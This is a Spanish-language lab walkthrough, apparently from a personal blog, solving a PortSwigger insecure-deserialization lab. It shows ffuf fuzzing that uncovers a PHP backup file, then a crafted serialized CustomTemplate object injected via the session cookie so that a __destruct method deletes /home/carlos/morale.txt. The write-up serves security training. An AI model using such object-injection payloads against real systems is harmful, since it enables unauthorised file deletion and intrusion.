---
title: "Arbitrary object injection in PHP"
description: "Laboratorio de Portswigger sobre Insecure Deserialization"
date: 2024-12-31 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - Insecure Deserialization
tags:
  - Insecure Deserialization
  - Arbitrary object injection in PHP
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza un mecanismo de `sesiones` basado en `serialización` y es vulnerable a la `inyección arbitraria de objetos`. Para `resolver` el laboratorio, debemos `crear e inyectar un objeto serializado malicioso` para `eliminar` el archivo `morale.txt` del directorio personal de `Carlos`. Necesitaremos `obtener acceso` al `código fuente` para `resolver` este `laboratorio`. Podemos `iniciar sesión` en nuestra cuenta utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Insecure-Deserialization-Lab-4/image_1.png)

Pulsamos sobre `My account` y nos `logueamos` utilizando las credenciales `wiener:peter`

![](/assets/img/Insecure-Deserialization-Lab-4/image_2.png)

Si hacemos `Ctrl + u` e `inspeccionamos` el `código fuente` de la web, vemos como en la `parte inferior` hay un `comentario` que hace alusión a la ruta `/libs/CustomTemplate.php`

![](/assets/img/Insecure-Deserialization-Lab-4/image_3.png)

`Fuzzeamos` en busca de `archivos` de `backup` y `encontramos` un `archivo` llamado `CustomTemplate.php~`

```
# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt -u https://0a81003d04de82aa80dafdef00120067.web-security-academy.net/libs/CustomTemplateFUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0a81003d04de82aa80dafdef00120067.web-security-academy.net/libs/CustomTemplateFUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 139ms]
.php~                   [Status: 200, Size: 1130, Words: 277, Lines: 39, Duration: 55ms]
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 132ms]
:: Progress: [2450/2450] :: Job [1/1] :: 19 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

Si accedemos a `https://0a81003d04de82aa80dafdef00120067.web-security-academy.net/libs/CustomTemplate.php~` podemos ver el `código` del `archivo php`. Si nos fijamos bien en el código vemos los métodos `__destruct()` y `__construct()`, los cuales son `métodos mágicos`, en `PHP` es fácil reconocerlos porque llevan `__` siempre en su nombre. Los métodos mágicos en PHP son funciones especiales predefinidas que se `ejecutan automáticamente` en `respuesta` a ciertos `eventos` o `interacciones` con un `objeto`. En este caso el método que nos interesa es el método mágico `__destruct`, que `borra` el `archivo` que esté en la variable `lock_file_path`

![](/assets/img/Insecure-Deserialization-Lab-4/image_4.png)

`Refrescamos` la `web` con `F5` y `capturamos` la `petición` con `Burpsuite`, al hacerlo vemos que el `parámetro session` contiene un `objeto`

![](/assets/img/Insecure-Deserialization-Lab-4/image_5.png)

`Obtenemos` la `longitud` de `/home/carlos/morale.txt`

```
# echo -n '/home/carlos/morale.txt' | wc -c 
```

`Obtenemos` la `longitud` de `lock_file_path`

```
# echo -n 'lock_file_path' | wc -c 
```

`Obtenemos` la `longitud` de `CustomTemplate`

```
# echo -n 'CustomTemplate' | wc -c
```

`Modificamos` el `objeto` cambiando la `clase` a `CustomTemplate` y `añadiéndole` el parámetro `lock_file_path`, de forma que si el archivo `/home/carlos/morale.txt` existe lo borre

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Nos dirigimos al `navegador` y pulsamos `Ctrl + Shift + i`, pegamos el nuevo valor para `session` y `refrescamos` la `web` pulsando `F5`. Si todo ha funcionado correctamente deberíamos haber `borrado` el `archivo` y `completado` el `laboratorio`

![](/assets/img/Insecure-Deserialization-Lab-4/image_6.png)
